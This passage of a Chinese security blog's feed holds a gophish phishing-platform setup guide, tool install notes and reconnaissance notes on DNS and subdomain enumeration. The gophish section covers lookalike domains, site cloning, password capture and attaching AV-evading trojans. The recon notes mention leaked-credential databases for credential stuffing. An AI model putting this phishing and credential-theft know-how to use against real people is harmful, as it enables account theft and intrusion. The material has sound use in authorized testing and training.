git@your_ip:/home/git/youzipii.git</span><br><span class="line">branch: master #这个有的可能是main，记得改成master，不然可能不会更新</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241204174146857.png" alt="image-20241204174146857"></p><p><img src="/../image/image-20241204174210113.png" alt="image-20241204174210113"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>remmina-ctos</title>
      <link href="/2024/11/29/remmina-ctos/"/>
      <url>/2024/11/29/remmina-ctos/</url>
      
        <content type="html"><![CDATA[<h1 id="remmina安装"><a href="#remmina安装" class="headerlink" title="remmina安装"></a>remmina安装</h1><p>项目地址:<a href="https://github.com/FreeRDP/Remmina.git">https://github.com/FreeRDP/Remmina.git</a></p><h2 id="更新源"><a href="#更新源" class="headerlink" title="更新源"></a>更新源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum -y update //之前换过阿里的源了</span><br></pre></td></tr></table></figure><h2 id="安装依赖项"><a href="#安装依赖项" class="headerlink" title="安装依赖项"></a>安装依赖项</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install gtk3-devel libssh-devel libvncserver-devel spice-gtk3-devel libx2go-devel</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> remote </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gophish搭建使用</title>
      <link href="/2024/11/22/gophish%E6%90%AD%E5%BB%BA%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/11/22/gophish%E6%90%AD%E5%BB%BA%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="gophish搭建使用"><a href="#gophish搭建使用" class="headerlink" title="gophish搭建使用"></a>gophish搭建使用</h1><p>参考链接：<a href="https://blog.csdn.net/qq_42939527/article/details/107485116">https://blog.csdn.net/qq_42939527/article/details/107485116</a></p><p>Gophish项目地址：<a href="https://github.com/gophish/gophish">https://github.com/gophish/gophish</a></p><p>Gophish：开源网络钓鱼工具包</p><p>[Gophish]（<a href="https://getgophish.com/%EF%BC%89">https://getgophish.com/）</a> 是一个开源网络钓鱼工具包，专为企业和渗透测试人员设计。它提供了快速轻松地设置和执行网络钓鱼参与和安全意识培训的能力。</p><h2 id="搭建过程（Linux）"><a href="#搭建过程（Linux）" class="headerlink" title="搭建过程（Linux）"></a>搭建过程（Linux）</h2><p>操作系统：Linux debian 6.1.0-25-amd64</p><p>如果是在云服务器上搭建，记得开放相关端口</p><p>下载压缩包，解压</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip</span><br><span class="line">unzip g</span><br><span class="line">unzip gophish-v0.12.1-linux-64bit.zip -d ./gophish</span><br></pre></td></tr></table></figure><p>修改配置文件,赋予权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd gophish</span><br><span class="line">chmod +x gophish</span><br><span class="line">vi config.json</span><br></pre></td></tr></table></figure><p>我这里因为是部署在服务器上，所以listen_url修改成0.0.0.0:3333了</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;admin_server&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;listen_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.0.0.0:3333&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;use_tls&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;cert_path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gophish_admin.crt&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;key_path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gophish_admin.key&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;trusted_origins&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;phish_server&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;listen_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.0.0.0:80&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;use_tls&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;cert_path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;example.crt&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;key_path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;example.key&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;db_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sqlite3&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;db_path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gophish.db&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;migrations_prefix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;db/db_&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;contact_address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;logging&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;filename&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>运行 gophish：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./gophish</span><br></pre></td></tr></table></figure><p>注意账号是admin，默认密码会打印在终端</p><p><img src="/../image/image-20241122100643742.png" alt="image-20241122100643742"></p><p><strong>访问后台管理系统：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://your_ip:3333</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241122100313939.png" alt="image-20241122100313939"></p><p>输入账号密码进入后台，会提示要先重置密码，设置好密码后</p><p><img src="/../image/image-20241122100930386.png" alt="image-20241122100930386"></p><p><strong>访问钓鱼界面：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://your_ip</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241122102633433.png" alt="image-20241122102633433"></p><p>文章中提到用.&#x2F;gophish启动脚本过一段时间会断了，需要长期保持运行可以结合nohup与&amp;来启动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nohup ./gophish &amp;</span><br></pre></td></tr></table></figure><p>nohup 介绍：</p><p><a href="https://blog.csdn.net/weixin_49114503/article/details/134266408">https://blog.csdn.net/weixin_49114503/article/details/134266408</a></p><p>进入后台后，左边的栏目即代表各个功能，分别是<code>Dashboard 仪表板</code> 、<code>Campaigns 钓鱼事件</code> 、<code>Users &amp; Groups 用户和组</code> 、<code>Email Templates 邮件模板</code> 、<code>Landing Pages 钓鱼页面</code> 、<code>Sending Profiles 发件策略</code>六大功能</p><h2 id="Sending-Profiles-发件策略"><a href="#Sending-Profiles-发件策略" class="headerlink" title="Sending Profiles 发件策略"></a>Sending Profiles 发件策略</h2><p>Sending Profiles 的主要作用是<code>将用来发送钓鱼邮件的邮箱配置到 gophish</code></p><p>点击<code>New Profile</code>新建一个策略，依次来填写各个字段</p><p><strong>Name：</strong><br>Name 字段是为新建的发件策略进行命名，不会影响到钓鱼的实施，建议以发件邮箱为名字，例如如果使用 qq 邮箱来发送钓鱼邮件，则 Name 字段可以写<code>xxxxxx@qq.com</code></p><p><strong>Interface Type:</strong><br>Interface Type 是接口类型，默认为<code>SMTP 类型</code>且不可修改，因此需要发件邮箱开启 SMTP 服务</p><p>查看linux是否开启SMTP<a href="https://www.dongmanai.cn/post/B99dB22BE8Eb.html">https://www.dongmanai.cn/post/B99dB22BE8Eb.html</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet 邮件服务器 25</span><br></pre></td></tr></table></figure><p>我这边是没有,配置一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install postfix //一直ok</span><br><span class="line">sudo vim /etc/postfix/main.cf //修改inet_interfaces = all</span><br><span class="line">sudo service postfix restart</span><br></pre></td></tr></table></figure><p>配置SMTP</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/postfix/main.cf</span><br></pre></td></tr></table></figure><p>在文件中找到以下行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">myhostname = host.domain.tld</span><br><span class="line">mydomain = domain.tld</span><br><span class="line">myorigin = $mydomain</span><br><span class="line">inet_interfaces = all</span><br></pre></td></tr></table></figure><p>取消注释并将以下内容添加到文件末尾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">relayhost = [smtp.gmail.com]587</span><br><span class="line">smtp_use_tls=yes</span><br><span class="line">smtp_sasl_auth_enable=yes</span><br><span class="line">smtp_sasl_password_maps=hash/etc/postfix/sasl_passwd</span><br><span class="line">smtp_sasl_security_options=noanonymous</span><br></pre></td></tr></table></figure><p><strong>From:</strong></p><p>From 是发件人，即钓鱼邮件所显示的发件人。（在实际使用中，一般需要进行近似域名伪造）这里为了容易理解，就暂时以 qq 邮箱为例，所以 From 字段可以写：<code>test&lt;xxxxxx@qq.com&gt;</code>，我这里是填纯邮箱，不然会报501</p><p><strong>Host</strong>:</p><p>Host 是 smtp 服务器的地址，格式是 smtp.example.com:25，例如 qq 邮箱的 smtp 服务器地址为<code>smtp.qq.com</code>,这里25好像用不了，可以改成465<a href="https://blog.csdn.net/xhy18634297976/article/details/129187561">https://blog.csdn.net/xhy18634297976/article/details/129187561</a></p><p><strong>Username:</strong></p><p>Username 是 smtp 服务认证的用户名，如果是 qq 邮箱，Username 则是自己的 qq 邮箱号<code>xxxx@qq.com</code></p><p><strong>Password:</strong></p><p>Password 是 smtp 服务认证的密码，例如 qq 邮箱，需要在登录 qq 邮箱后，点击 <code>设置</code> - <code>账户</code> - <code>开启 SMPT 服务</code> 生成<code>授权码</code>，Password 的值则可以填收到的授权码</p><p><strong>（可选）Email Headers:</strong><br>Email Headers 是自定义邮件头字段，例如邮件头的<code>X-Mailer</code>字段，若不修改此字段的值，通过 gophish 发出的邮件，其邮件头的 X-Mailer 的值默认为 gophish</p><p><img src="/../image/image-20241122124035581.png" alt="image-20241122124035581"></p><p><img src="/../image/image-20241122124224078.png" alt="image-20241122124224078"></p><p>至此，发件邮箱的配置已经完成。当然，在实际钓鱼中，不可能使用自己的 qq 邮箱去发送钓鱼邮件。一是暴露自身身份，且邮件真实性低，二是 qq 邮箱这类第三方邮箱对每个用户每日发件数存在限制。<br>因此，如果需要大批量去发送钓鱼邮件，最好的方式是<strong>使用自己的服务器，申请近似域名，搭建邮件服务器来发件</strong></p><h2 id="Landing-Pages-钓鱼页面"><a href="#Landing-Pages-钓鱼页面" class="headerlink" title="Landing Pages 钓鱼页面"></a>Landing Pages 钓鱼页面</h2><p>完成钓鱼邮件的编写后，下一步则需要设计由邮件中超链接指向的钓鱼网页，点击<code>New Page</code>新建页面</p><p><strong>Name:</strong><br>Name 是用于为当前新建的钓鱼页面命名，可以简单命名为<code>钓鱼页面 1</code></p><p><strong>Import Site:</strong><br>与钓鱼邮件模板的编辑一样，gophish 为钓鱼页面的设计也提供了两种方式，第一种则是<code>Import Site</code><br>点击 Import Site 后，填写<code>被伪造网站的 URL</code>，再点击 Import，即可通过互联网自动抓取被伪造网站的前端代码，有点站点做了反爬，可能不好导入</p><p><img src="/../image/image-20241122143245908.png" alt="image-20241122143245908"></p><p><strong>内容编辑框：</strong><br>内容编辑框是编辑钓鱼页面的第二种方法，但是绝大多数情况下，它更偏向于用来辅助第一种方法，即对导入的页面进行源码修改以及预览。</p><p><img src="/../image/image-20241122143310145.png" alt="image-20241122143310145"></p><p>由于编码的不同，通常直接通过 Import Site 导入的网站，其中文部分多少存在<code>乱码现象</code>，这时候就需要查看源码并<code>手动修改</code>过来</p><p><strong>（重点）Capture Submitted Data:</strong><br>这个是用来后去用户提交的数据的，勾选后会多一个是否抓取密码，也可以勾上测试一下，最后填写重定向的地址即可，如账号或密码错误的页面等</p><p><img src="/../image/image-20241122143805736.png" alt="image-20241122143805736"></p><p>填写好以上参数，点击<code>Save Page</code>，即可保存编辑好的钓鱼页面</p><h2 id="Email-Templates-钓鱼邮件模板"><a href="#Email-Templates-钓鱼邮件模板" class="headerlink" title="Email Templates 钓鱼邮件模板"></a>Email Templates 钓鱼邮件模板</h2><p>完成了邮箱配置之后，就可以使用 gophish 发送邮件了。所以，接下来需要去编写钓鱼邮件的内容<br>点击<code>New Template</code>新建钓鱼邮件模板，依次介绍填写各个字段</p><p><strong>Name:</strong><br>同样的，这个字段是对当前新建的钓鱼邮件模板进行命名。</p><p><strong>Import Email:</strong><br>gophish 为编辑邮件内容提供了两种方式，第一种就是<code>Import Email</code></p><p>用户可以先在自己的邮箱系统中设计好钓鱼邮件，然后发送给自己或其他伙伴，收到设计好的邮件后，打开并选择<code>导出为 eml 文件</code>或者<code>显示邮件原文</code>，然后将内容<code>复制到 gophish 的 Import Email</code>中，即可将设计好的钓鱼邮件导入</p><p><img src="/../image/image-20241122144209767.png" alt="image-20241122144209767"></p><p>需要注意，在点击<code>Import</code>之前需要勾选上<code>Change Links to Point to Landing Page</code>，该功能实现了当创建钓鱼事件后，会将邮件中的超链接自动转变为钓鱼网站的 URL</p><p><strong>Subject:</strong><br>Subject 是邮件的主题，通常为了提高邮件的真实性，需要自己去编造一个吸引人的主题。</p><p><strong>内容编辑框：</strong><br>内容编辑框是编写邮件内容的第二种模式，内容编辑框提供了<code>Text</code>和<code>HTML</code>两种模式来编写邮件内容，使用方式与正常的编辑器无异。<br>其中 HTML 模式下的<code>预览功能</code>比较常用到，在编辑好内容后，点击预览，就可以清晰看到邮件呈现的具体内容以及格式</p><p><strong>Add Tracking Image:</strong><br>Add Tracking Image 是在钓鱼邮件末添加一个<code>跟踪图像</code>，用来跟踪受害用户是否打开了收到的钓鱼邮件。默认情况下是勾选的，如果不勾选就无法跟踪到受害用户是否打开了钓鱼邮件<br>（注：跟踪受害用户是否点击钓鱼链接以及捕捉提交数据不受其影响）<br><strong>Add Files:</strong><br>Add Files 是在发送的邮件中<code>添加附件</code>，一是可以添加相关文件提高邮件真实性，二是可以配合免杀木马诱导受害用户下载并打开</p><p>当填写完以上字段后，点击<code>Save Template</code>，就能保存当前编辑好的钓鱼邮件模板</p><h2 id="Users-amp-Groups-用户和组"><a href="#Users-amp-Groups-用户和组" class="headerlink" title="Users &amp; Groups 用户和组"></a>Users &amp; Groups 用户和组</h2><p><code>Users &amp; Groups</code> 的作用是将钓鱼的目标邮箱导入 gophish 中准备发送</p><p>点击<code>New Group</code>新建一个钓鱼的目标用户组<br><strong>Name:</strong><br>Name 是为当前新建的用户组命名</p><p><strong>Bulk Import Users:</strong><br>Bulk Import Users 是批量导入用户邮箱，它通过上传符合特定模板的<code>CSV 文件</code>来批量导入目标用户邮箱<br>点击旁边灰色字体的<code>Download CSV Template</code>可以下载特定的 CSV 模板文件。其中，模板文件的<code>Email</code>是必填项，其余的<code>Frist Name</code> 、<code>Last Name</code>、<code>Position</code>可选填</p><p><img src="/../image/image-20241122144616432.png" alt="image-20241122144616432"></p><p><strong>Add:</strong><br>除了批量导入目标用户的邮箱，gophish 也提供了单个邮箱的导入方法，这对于开始钓鱼前，钓鱼组内部测试十分方便，不需要繁琐的文件上传，直接填写<code>Email</code>即可，同样其余的<code>Frist Name</code> 、<code>Last Name</code>、<code>Position</code>可选填</p><p>编辑好目标用户的邮箱后，点击<code>Save Changes</code>即可保存编辑好的目标邮箱保存在 gophish 中</p><p><img src="/../image/image-20241122144649618.png" alt="image-20241122144649618"></p><h2 id="Campaigns-钓鱼事件"><a href="#Campaigns-钓鱼事件" class="headerlink" title="Campaigns 钓鱼事件"></a>Campaigns 钓鱼事件</h2><p>Campaigns 的作用是将上述四个功能<code>Sending Profiles</code> 、<code>Email Templates</code> 、<code>Landing Pages</code> 、<code>Users &amp; Groups</code>联系起来，并创建钓鱼事件<br><strong>在 Campaigns 中，可以新建钓鱼事件，并选择编辑好的钓鱼邮件模板，钓鱼页面，通过配置好的发件邮箱，将钓鱼邮件发送给目标用户组内的所有用户</strong></p><p><strong>Name:</strong><br>Name 是为新建的钓鱼事件进行命名</p><p><strong>Email Template:</strong><br>Email Template 即钓鱼邮件模板，这里选择刚刚上面编辑好的钓鱼邮件模板</p><p><strong>Landing Page:</strong><br>Landing Page 即钓鱼页面</p><blockquote><p><strong>（重点）URL:</strong><br>URL 是用来替换选定钓鱼邮件模板中超链接的值，该值指向部署了选定钓鱼页面的 url 网址（这里比较绕，下面具体解释一下，看完解释再来理解这句话）</p><p>简单来说，这里的 URL 需要填写<strong>当前运行 gophish 脚本主机的 ip</strong>。<br>因为启动 gophish 后，gophish 默认监听了<code>3333</code>和<code>80</code>端口，其中<code>3333</code>端口是后台管理系统，而<code>80</code>端口就是用来部署钓鱼页面的。<br>当 URL 填写了<code>http:// 主机 IP/</code>，并成功创建了当前的钓鱼事件后。gophish 会在主机的<code>80</code>端口部署当前钓鱼事件<code>所选定的钓鱼页面</code>，并在发送的钓鱼邮件里，将其中<code>所有的超链接</code>都替换成部署在<code>80</code>端口的钓鱼页面的 url</p></blockquote><p><strong>Launch Date:</strong><br>Launch Date 即钓鱼事件的实施日期，通常如果仅发送少量的邮箱，该项不需要修改。如果需要发送大量的邮箱，则配合旁边的<code>Send Emails By</code>效果更佳</p><p><strong>（可选）Send Emails By:</strong><br>Send Emails By 配合<code>Launch Date</code>使用，可以理解为当前钓鱼事件下所有钓鱼邮件发送完成的时间。<code>Launch Date</code>作为起始发件时间，<code>Send Emails By</code> 作为完成发件时间，而它们之间的时间将被所有邮件<code>以分钟为单位平分</code>。</p><p><img src="/../image/image-20241122145017514.png" alt="image-20241122145017514"></p><h2 id="Dashboard-仪表板"><a href="#Dashboard-仪表板" class="headerlink" title="Dashboard 仪表板"></a>Dashboard 仪表板</h2><p>当创建了钓鱼事件后，Dashboard 会自动开始统计数据。统计的数据项包括<code>邮件发送成功的数量及比率</code>，<code>邮件被打开的数量及比率</code>，<code>钓鱼链接被点击的数量及比率</code>，<code>账密数据被提交的数量和比率</code>，<code>以及收到电子邮件报告的数量和比率</code>。另外，还有时间轴记录了每个行为发生的时间点</p><p>需要注意的是，Dashboard 统计的是<code>所有钓鱼事件</code>的数据，而非单个钓鱼事件的数据，如果仅需要查看单个钓鱼事件的统计数据，可以在<code>Campaigns</code>中找到该钓鱼事件，点击<code>View Results</code>按钮查看</p><p><img src="/../image/image-20241122151535669.png" alt="image-20241122151535669"></p><p><img src="/../image/image-20241122151614096.png" alt="image-20241122151614096"></p><p>真实场景考虑:</p><p>近似域名、搭建自己的邮箱服务器，选择邮件主题，确定发件人等</p>]]></content>
      
      
      
        <tags>
            
            <tag> gophish </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>aquatone-discover安装</title>
      <link href="/2024/11/20/aquatone-discover%E5%AE%89%E8%A3%85/"/>
      <url>/2024/11/20/aquatone-discover%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="aquatone-discover"><a href="#aquatone-discover" class="headerlink" title="aquatone-discover"></a>aquatone-discover</h1><p><a href="https://blog.csdn.net/weixin_71982689/article/details/142676332">https://blog.csdn.net/weixin_71982689/article/details/142676332</a></p><h2 id="安装chromium"><a href="#安装chromium" class="headerlink" title="安装chromium"></a>安装chromium</h2><p>因为要用到截图功能，相当于打开浏览器访问，因此需要kali中先安装chromium<br>执行以下命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt install chromium //比较久</span><br></pre></td></tr></table></figure><p>安装完毕后执行<code>chromium -h</code> 出现以下内容即表示成功</p><p><img src="/../image/image-20241120172812553.png" alt="image-20241120172812553"></p><h2 id="将aquatone复制到-x2F-usr-x2F-bin-x2F-目录下"><a href="#将aquatone复制到-x2F-usr-x2F-bin-x2F-目录下" class="headerlink" title="将aquatone复制到&#x2F;usr&#x2F;bin&#x2F;目录下"></a>将aquatone复制到&#x2F;usr&#x2F;bin&#x2F;目录下</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /home/eraser/desktop/aquatone /usr/bin</span><br><span class="line">chmod 755 aquatone</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241120173020654.png" alt="image-20241120173020654"></p><p>发现安错了。。。</p><p>直接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade</span><br><span class="line">gem install apuqtone</span><br></pre></td></tr></table></figure><p>就行了</p><p><a href="https://ssssdl.github.io/2019/01/15/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8C%96%E6%8E%98%E5%B7%A5%E5%85%B7aquatone/">https://ssssdl.github.io/2019/01/15/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8C%96%E6%8E%98%E5%B7%A5%E5%85%B7aquatone/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2024/11/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2024/11/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="信息收集总览"><a href="#信息收集总览" class="headerlink" title="信息收集总览"></a>信息收集总览</h2><h3 id="熟悉信息收集种类"><a href="#熟悉信息收集种类" class="headerlink" title="熟悉信息收集种类"></a>熟悉信息收集种类</h3><p>DNS、子域名、C段、邮箱、指纹、社工库、钓鱼攻击</p><h3 id="了解信息收集的原因"><a href="#了解信息收集的原因" class="headerlink" title="了解信息收集的原因"></a>了解信息收集的原因</h3><p>DNS：</p><ul><li>确定企业网站运行规模</li><li>可以从DNS中收集子域名、IP等</li><li>控制网站解析</li></ul><p>子域名：</p><ul><li>确定企业网站运行数量，从而进行下一步(安全评估)准备</li><li>获得不同子域名所映射的IP，从而获得不同C段</li><li>寻找更大的安全脆弱点和面</li></ul><p>C段：</p><p>什么是C段</p><p>在IP地址的4段号码中，前3段号码为网络号码，剩下的1段号码为本地计算机的号码</p><p>192.168.1.5&#x2F;24</p><p>收集原因</p><ul><li>确定C段存活主机数量</li><li>确定C段中主机的端口，服务，操作系统等</li></ul><p>收集原因</p><ul><li>通过分析邮箱格式和后缀，可以得知邮箱命名规律和邮箱服务器</li><li>为爆破登录表单收集数据，可形成字典</li><li>发送钓鱼邮件，执行高级APT控制</li></ul><p>指纹：</p><ul><li><p>Web指纹</p><ul><li><p>获取运行的脚本语言，开发框架，CMS，寻找脆弱点(漏洞)</p></li><li><p>如:.action 一般可以确定为Struts2</p></li><li><p>如:Powered by **</p></li></ul></li><li><p>中间件指纹</p><ul><li><p>获取中间件使用的产品和版本</p></li><li><p>通过产品和版本查询是否有漏洞存在，如:struts2反序列化，iis文件解析</p></li></ul></li><li><p>系统指纹</p><ul><li>获取操作系统使用的产品和版本可以在以后渗透中提供渗透基准如:大小写，shell部署方式</li></ul></li></ul><p>社工库：</p><ul><li>寻找指定目标的已经泄露的数据</li><li>如:邮箱，获取到企业内部人员已经泄露的密码，可以在撞库，爆破中使用</li><li>如:姓名，手机号，找回密码，重置信息</li></ul><p>钓鱼攻击：</p><ul><li>邮件、链接、办公文件</li><li>构造鱼叉攻击和水坑攻击</li><li>绕过边界防御设备</li><li>从内部瓦解防御网络，直接反弹shell</li></ul><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><h3 id="Domain-Name-system-域名系统"><a href="#Domain-Name-system-域名系统" class="headerlink" title="Domain Name system 域名系统"></a>Domain Name system 域名系统</h3><p>将域名和IP地址相互映射的一个分布式数据库</p><ul><li>协议:TCP&#x2F;UDP</li><li>端口:53</li><li>域名长度:每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符</li><li><a href="https://blog.csdn.net/mocas_wang/article/details/109167660">https://blog.csdn.net/mocas_wang/article/details/109167660</a></li></ul><p><img src="/../image/9cdf18fa9324dde8a69c8f32556bb9a8.jpeg" alt="这里写图片描述"></p><h3 id="DNS-A记录"><a href="#DNS-A记录" class="headerlink" title="DNS A记录"></a>DNS A记录</h3><p>A记录指定域名对应的IP地址</p><p>查询方法:</p><p>nslookup <a href="http://www.baidu.com/">www.baidu.com</a></p><p><img src="/../image/image-20241120162239436.png" alt="image-20241120162239436"></p><p>dig <a href="http://www.baidu.com/">www.baidu.com</a> 【+short】【@server】【+trace】</p><p><img src="/../image/image-20241120162321873.png" alt="image-20241120162321873"></p><h3 id="DNS-NS记录"><a href="#DNS-NS记录" class="headerlink" title="DNS NS记录"></a>DNS NS记录</h3><p>NS(Name Server)记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析。<br>查询方法:dig -t NS <a href="http://www.163.com/">www.163.com</a></p><blockquote><p>-t 用来指定查询的种类</p></blockquote><p><img src="/../image/image-20241120162458865.png" alt="image-20241120162458865"></p><h3 id="DNS-TXT记录"><a href="#DNS-TXT记录" class="headerlink" title="DNS TXT记录"></a>DNS TXT记录</h3><p>TXT记录，一般指某个主机名或域名的说明。</p><p>查询方法:dig -t TXT <a href="http://www.163.com/">www.163.com</a></p><p><img src="/../image/image-20241120162754423.png" alt="image-20241120162754423"></p><h3 id="DNS-MX记录"><a href="#DNS-MX记录" class="headerlink" title="DNS MX记录"></a>DNS MX记录</h3><p>MX(Mail Exchanger)记录是邮件交换记录，它指向一个邮件服务器</p><p>用于电子邮件系统发邮件时根据收信人的地址后缀来定位邮件服务器</p><p>查询方法:dig -t MX 163.com</p><p><img src="/../image/image-20241120162858077.png" alt="image-20241120162858077"></p><h3 id="DNS-CNAME记录"><a href="#DNS-CNAME记录" class="headerlink" title="DNS CNAME记录"></a>DNS CNAME记录</h3><p>CNAME记录可以将注册的不同域名都转到一个域名记录上，由这个域名记录统一解析管理</p><p>查询方法:dig-t CNAME163.com</p><p><img src="/../image/image-20241120163003090.png" alt="image-20241120163003090"></p><h3 id="域名信息查询"><a href="#域名信息查询" class="headerlink" title="域名信息查询"></a>域名信息查询</h3><p>whois查询，但有时候会回应我们没有权限去查询这个域名的whois数据库</p><p><img src="/../image/image-20241120163144197.png" alt="image-20241120163144197"></p><p>在线查询：</p><ul><li>whois.iana.org</li><li><a href="http://www.arin.net/">www.arin.net</a></li><li>who.is</li><li>centralops.net&#x2F;co&#x2F;</li><li><a href="http://www.17ce.com/">www.17ce.com</a></li></ul><p>subdomainbrute工具使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python subDomainsBrute.py --full -t 10 sangfor.com.cn -w</span><br></pre></td></tr></table></figure><p>通过子域名的爆破，可以进一步明确企业网络资产（有哪些域名、域名对应什么系统、域名集中的C段地址等等），这是攻击者、防御者都需要时刻关注的方面。</p><p>扫描完成后，会在该工具同目录下，生成对应的文本文件</p><p><img src="/../image/image-20241120165809064.png" alt="image-20241120165809064"></p><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><h3 id="子域名收集原因"><a href="#子域名收集原因" class="headerlink" title="子域名收集原因"></a>子域名收集原因</h3><p>子域名枚举可以在测试范围内发现更多的域或子域，这将增大漏洞发现的机率。</p><p>有些隐藏的、被忽略的子域上运行的应用程序可能帮助我们发现重大漏洞。</p><p>在同一个组织的不同域或应用程序中往往存在相同的漏洞</p><h3 id="子域名收集方法"><a href="#子域名收集方法" class="headerlink" title="子域名收集方法"></a>子域名收集方法</h3><h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><p>原理：字典匹配枚举存在的域名</p><p>kali：</p><ul><li>subDomainBrute</li><li>dnsmap</li></ul><p><img src="/../image/image-20241120165659918.png" alt="image-20241120165659918"></p><p>windows:</p><ul><li>fuzzDomain</li><li>子域名挖掘机</li></ul><h4 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h4><p>原理：通过搜索引擎获取已经爬取到的域名</p><p>语法：Site: 163.cn</p><p>工具：</p><p><a href="https://github.com/laramies/theHarvester">theharvester</a>:<a href="https://blog.csdn.net/2302_82189125/article/details/135982119">https://blog.csdn.net/2302_82189125/article/details/135982119</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">theHarvester -d pinduoduo.com -l 400 -b baidu</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241120171446158.png" alt="image-20241120171446158"></p><p>aquatone:<a 